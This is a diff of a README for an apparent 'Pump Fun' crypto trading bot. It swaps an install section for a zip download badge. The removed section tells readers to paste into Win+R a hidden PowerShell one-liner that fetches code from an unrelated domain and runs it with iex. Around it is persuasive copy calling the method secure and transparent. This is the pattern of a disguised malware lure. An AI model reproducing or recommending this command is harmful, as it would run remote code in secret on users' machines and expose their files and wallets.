@@ -57,26 +57,11 @@ There are many trading bots, **but**:
 
 ---
 
-## 📦 Installation
+<h2>📥 Download the Program</h2>
 
-### 🚀 Why Use a Shell Script Instead
-
-We’ve switched from a traditional download button to a one-line shell script because it’s simply a **better, faster, and smarter way** to deliver the tool:
-
-- ✅ **Always Up-to-Date** – Installs the latest version automatically.
-- ⚙️ **One-Liner Setup** – Just copy, paste, and run. No manual downloads.
-- 💡 **Smart Automation** – Automatically handles setup and dependencies.
-- 🛡️ **Secure & Transparent** – Uses TLS 1.2. You can inspect the code yourself.
-- 🔧 **Dev-Friendly** – CLI-first approach that’s fast, efficient, and clean.
-
----
-
-### 💻 Install Command (Run via `Win + R`)
-<pre>
-  <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://aidetector.tools/389290d';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: oba71').Content;</code>
-</pre>
-
----
+<a href="https://github.com/PumpFun-Bot/Pump-Fun-Bot/releases/download/PumpFun_Bot_gui/PumpFunBot.zip" download>
+  <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
+</a>
 
 ## 🛠️ In Development
 
